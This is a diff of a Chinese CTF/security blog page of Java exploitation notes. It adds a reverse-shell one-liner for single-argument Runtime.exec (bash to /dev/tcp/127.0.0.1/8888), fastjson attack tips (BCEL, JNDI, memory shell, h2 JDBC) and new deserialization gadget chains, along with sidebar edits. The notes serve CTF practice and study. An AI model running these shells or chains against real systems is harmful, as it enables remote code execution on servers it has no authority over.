@@ -642,13 +642,21 @@
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73185293/article/details/131695528">https://blog.csdn.net/m0_73185293/article/details/131695528</a></p>
 <p>JAVA URLClassLoader过滤了http和file协议可以用jar协议绕过</p>
 <p>审代码，看到有读文件，然后根据布尔值来读的，一定要想起竞争！遇到很多次了</p>
+<h3 id="单参数exec绕过"><a href="#单参数exec绕过" class="headerlink" title="单参数exec绕过"></a>单参数exec绕过</h3><p>一般用的是单参数exec</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240913125109102.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240913125109102.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240913125109102"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/107098353">https://blog.csdn.net/whatday/article/details/107098353</a></p>
+<p>这篇文章讲了java单参数exec反弹shell应该使用<code>Runtime.getRuntime().exec(&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/127.0.0.1/8888 0&gt;&amp;1&quot;);</code></p>
 <h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><p>fastjson目标不出网，&lt;&#x3D;1.2.24下打BCEL，需要回显可以打内存马</p>
 <p>目标出网 ，&lt;&#x3D;1.2.47，打JNDI</p>
 <p>1.2.68+commons-io能写文件</p>
+<p>github上有payload项目，我所知的唯一缺少的是fastjson&gt;1.2.36+有h2依赖能打jdbc attack</p>
 <h2 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h2><p>一个gadget衔接合集，仅统计常用衔接链</p>
 <p>Hessian2反序列化和Kryo、FST反序列化会触发hashMap.put</p>
 <p>compare通常伴随着任意getter调用（因为compare需要逐项取值对比）</p>
 <p>BadAttributeValueExpException.readObject -&gt; toString</p>
+<p>XString.equals -&gt; toString</p>
+<p>HashMap.readObject() -&gt; AbstractMap.equals -&gt; UIDefault$TextAndMnemonicHashMap.get -&gt; toString</p>
+<p>EventListenerList.readObject() -&gt; tostring</p>
 <p>(JDK8u65) AnnotationInvocationHandler.invoke -&gt; get</p>
 <p>(jdk7u21&#x2F;8u20 rce) AnnotationInvocationHandler.equalsImpl -&gt; invoke </p>
 <p>PriorityQueue.readObject -&gt; compare</p>
@@ -661,12 +669,12 @@
 <p>(fastjson) JSONObject.toString -&gt; getter (1.2.83都能打原生二次反序列化)</p>
 <p>signedObject.getObject -&gt; readObject</p>
 <p>JdbcRowSetImpl.setAutoCommit -&gt;  JNDI</p>
+<p>(resin) com.caucho.naming.QName#toString -&gt; JNDI</p>
 <p>(Tomcat) BasicDataSource.getConnection -&gt; Class.forName</p>
 <p>(c3p0) ReferenceableUtils#ReferenceSerialized.referenceToObject -&gt; Reference JNDI</p>
 <p>(rome) ToStringBean.toString -&gt; getter</p>
 <p>(rome) EqualsBean.beanEquals -&gt; getter</p>
 <p>(rome) EqualsBean.hashCode -&gt; toString</p>
-<p>(spring) XString.equals -&gt; toString</p>
 <p>(spring) HashMap.put -&gt; HotSwappableTargetSource.equals -&gt; equals</p>
 <p>HashMap、HashSet、HashTable 碰撞也能触发equals（见<a href="https://godownio.github.io/2024/09/26/rome-lian/#EqualsBeans%E9%93%BE">https://godownio.github.io/2024/09/26/rome-lian/#EqualsBeans%E9%93%BE</a>) </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap/HashSet/HashTable.readObject</span><br><span class="line">HashMap.put</span><br><span class="line">HashMap.putval</span><br><span class="line">HashMap.equals</span><br><span class="line">Abstractmap.equals</span><br><span class="line">equals</span><br></pre></td></tr></table></figure>
@@ -1077,7 +1085,7 @@
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctf%E5%B9%B3%E5%8F%B0"><span class="toc-text">ctf平台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Common-Collections"><span class="toc-text">Common-Collections</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#trick%E7%BB%95%E8%BF%87"><span class="toc-text">trick绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson"><span class="toc-text">fastjson</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gadget"><span class="toc-text">Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CC-Gadget"><span class="toc-text">CC Gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jwt"><span class="toc-text">jwt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hessian"><span class="toc-text">hessian</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E9%97%AE%E9%A2%98"><span class="toc-text">无回显问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flask-SSTI%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-text">flask SSTI无回显</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle%E4%B8%8D%E5%87%BA%E7%BD%91%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-text">pickle不出网无回显</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#other%E9%AA%9A%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3"><span class="toc-text">other骚报错解决</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#maven%E6%89%93%E5%8C%85%E9%97%AE%E9%A2%98"><span class="toc-text">maven打包问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#paython%E4%BC%A0%E5%8F%82%E9%97%AE%E9%A2%98"><span class="toc-text">paython传参问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#idea%E6%96%87%E4%BB%B6%E5%92%96%E5%95%A1%E6%9D%AF%E9%97%AE%E9%A2%98"><span class="toc-text">idea文件咖啡杯问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jinja2%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98"><span class="toc-text">jinja2安装问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fenjing%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98"><span class="toc-text">fenjing安装问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%97%A0%E6%95%88%E9%97%AE%E9%A2%98"><span class="toc-text">nodejs原型链污染无效问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proc-ctf%E5%B8%B8%E7%94%A8%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-text">proc ctf常用文件信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%9D%97%E6%89%A7%E8%A1%8C%E9%97%AE%E9%A2%98"><span class="toc-text">静态代码块执行问题</span></a></li></ol></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctf%E5%B9%B3%E5%8F%B0"><span class="toc-text">ctf平台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Common-Collections"><span class="toc-text">Common-Collections</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#trick%E7%BB%95%E8%BF%87"><span class="toc-text">trick绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E5%8F%82%E6%95%B0exec%E7%BB%95%E8%BF%87"><span class="toc-text">单参数exec绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson"><span class="toc-text">fastjson</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gadget"><span class="toc-text">Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CC-Gadget"><span class="toc-text">CC Gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jwt"><span class="toc-text">jwt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hessian"><span class="toc-text">hessian</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E9%97%AE%E9%A2%98"><span class="toc-text">无回显问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flask-SSTI%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-text">flask SSTI无回显</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle%E4%B8%8D%E5%87%BA%E7%BD%91%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-text">pickle不出网无回显</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#other%E9%AA%9A%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3"><span class="toc-text">other骚报错解决</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#maven%E6%89%93%E5%8C%85%E9%97%AE%E9%A2%98"><span class="toc-text">maven打包问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#paython%E4%BC%A0%E5%8F%82%E9%97%AE%E9%A2%98"><span class="toc-text">paython传参问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#idea%E6%96%87%E4%BB%B6%E5%92%96%E5%95%A1%E6%9D%AF%E9%97%AE%E9%A2%98"><span class="toc-text">idea文件咖啡杯问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jinja2%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98"><span class="toc-text">jinja2安装问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fenjing%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98"><span class="toc-text">fenjing安装问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%97%A0%E6%95%88%E9%97%AE%E9%A2%98"><span class="toc-text">nodejs原型链污染无效问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proc-ctf%E5%B8%B8%E7%94%A8%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-text">proc ctf常用文件信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%9D%97%E6%89%A7%E8%A1%8C%E9%97%AE%E9%A2%98"><span class="toc-text">静态代码块执行问题</span></a></li></ol></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
@@ -1103,6 +1111,27 @@
       <!-- hash算法 -->
       
       <div class="aside-list">
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/04/23/resin-fan-xu-lie-hua/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8151.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8151.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">04-23</span>
+                
+              </div>
+              <a class="post-title" href="/2025/04/23/resin-fan-xu-lie-hua/">Resin反序列化JNDI</a>
+            </div>
+          </div>
         
           <div class="aside-list-item">
             
@@ -1185,27 +1214,6 @@
                 
               </div>
               <a class="post-title" href="/2025/04/17/apache-hertzbeat-snakeyaml-fan-xu-lie-hua/">Apache HertzBeat SnakeYaml 反序列化远程代码执行漏洞（CVE-2024-42323）</a>
-            </div>
-          </div>
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2025/04/15/shiro-fan-xu-lie-hua-tu-po-chang-du-xian-zhi/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8146.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8146.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">04-15</span>
-                
-              </div>
-              <a class="post-title" href="/2025/04/15/shiro-fan-xu-lie-hua-tu-po-chang-du-xian-zhi/">Shiro反序列化突破长度限制</a>
             </div>
           </div>
         
